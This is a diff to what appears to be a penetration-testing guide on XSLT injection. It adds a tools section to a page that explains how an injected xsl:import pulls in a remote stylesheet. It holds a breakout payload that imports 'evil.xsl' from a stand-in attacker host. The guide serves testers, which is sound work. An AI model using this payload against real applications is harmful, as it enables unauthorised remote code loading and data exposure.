@@ -50,6 +50,12 @@ A hit on the attacker host proves the fetch fires and reveals the engine's user 
 
 The injection reaches the top level in two common shapes. Where the application concatenates a parameter into the stylesheet near its head, the value `"/><xsl:import href="http://attacker.example/evil.xsl"/><xsl:template match="x` closes the surrounding element and inserts the import. Where the application accepts an uploaded or referenced stylesheet outright, no breakout is needed: the import or include is simply part of the submitted document. Protocol support varies by engine, so `http`, `ftp`, and `jar:` URIs are each worth probing when the default `http` resolver is restricted.
 
+## Tools
+
+- **Burp Collaborator**: confirming the compile-time fetch of a remote stylesheet.
+- **Burp Repeater**: injecting `xsl:import` and `xsl:include` with attacker-hosted hrefs.
+- Manual testing with a hosted `evil.xsl` carrying the payload.
+
 ## References
 
 - [W3C XSLT 2.0: Combining Stylesheets with xsl:include and xsl:import](https://www.w3.org/TR/xslt20/#include)
